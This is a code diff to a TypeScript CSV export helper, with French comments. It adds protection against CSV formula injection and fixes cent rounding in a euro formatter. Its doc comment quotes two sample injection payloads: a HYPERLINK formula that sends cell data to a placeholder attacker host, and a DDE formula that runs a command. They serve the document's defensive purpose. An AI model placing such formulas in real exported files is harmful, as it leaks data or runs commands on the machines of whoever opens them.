@@ -25,19 +25,39 @@ export interface CsvColumn<TRow> {
 }
 
 /**
- * Échappe une valeur de cellule selon RFC 4180 (avec séparateur `;`).
+ * Échappe une valeur de cellule selon RFC 4180 (avec séparateur `;`)
+ * + neutralisation CSV-injection (CWE-1236).
+ *
  * - `null`/`undefined` → cellule vide.
  * - Nombre → `String(number)` (le formatage FR doit être fait en amont
  *   par l'extracteur, ce helper ne devine pas si c'est un montant).
+ * - String commençant par `=`, `+`, `-`, `@`, `\t`, `\r` → préfixée par
+ *   une apostrophe sentinel et force-quotée. Excel/LibreOffice/Google
+ *   Sheets interprètent ces caractères de tête comme une formule (ex.
+ *   `=HYPERLINK("https://attacker/?x="&A1,"click")`, `=cmd|'/c calc'!A1`).
+ *   Le sentinel `'` neutralise sans altérer l'affichage utilisateur.
  * - String contenant `;`, `"`, `\n`, `\r` → entouré de `"..."`, `"` doublés.
  *
  * Cas limites :
  * - `''` reste `''` (pas besoin de quoter une chaîne vide).
  * - String avec espaces seulement → quote pour préserver (Excel trim-isable).
  */
+// P1 CR — un nombre signé pur (ex. `'-123,45'` produit par formatEurFr,
+// `'+12'`, `'-1.5'`) n'est pas une formule Excel valide → on le laisse
+// passer sans sentinel pour préserver le format numérique. Toute autre
+// chaîne commençant par un caractère dangereux est neutralisée.
+const NUMBER_LIKE = /^[+-]?\d+(?:[,.]\d+)?$/
+const DANGER_PREFIX = /^[=+\-@\t\r]/
+
 export function escapeCsvCell(value: string | number | null | undefined): string {
   if (value === null || value === undefined) return ''
   const str = typeof value === 'number' ? String(value) : value
+  if (str.length === 0) return ''
+  // P1 CR — neutralisation CSV-injection avant tout autre traitement, sauf
+  // pour les nombres signés "pacifiques" (cf. NUMBER_LIKE ci-dessus).
+  if (typeof value === 'string' && DANGER_PREFIX.test(str) && !NUMBER_LIKE.test(str)) {
+    return `"'${str.replace(/"/g, '""')}"`
+  }
   // Détection : le champ contient un caractère réservé ?
   if (/[;"\r\n]/.test(str)) {
     return `"${str.replace(/"/g, '""')}"`
@@ -57,8 +77,12 @@ export function escapeCsvCell(value: string | number | null | undefined): string
  */
 export function formatEurFr(cents: number | null | undefined): string {
   if (cents === null || cents === undefined || !Number.isFinite(cents)) return ''
-  const sign = cents < 0 ? '-' : ''
-  const abs = Math.abs(cents)
+  // P2 CR — round any non-integer cents BEFORE split. Sans cela, un upstream
+  // qui passe `12345.67` produirait `'123,45.67'` (output malformé qui casse
+  // la conversion FR Excel et tout downstream parse).
+  const intCents = Math.round(cents)
+  const sign = intCents < 0 ? '-' : ''
+  const abs = Math.abs(intCents)
   const euros = Math.floor(abs / 100)
   const remainder = abs - euros * 100
   const decimals = String(remainder).padStart(2, '0')
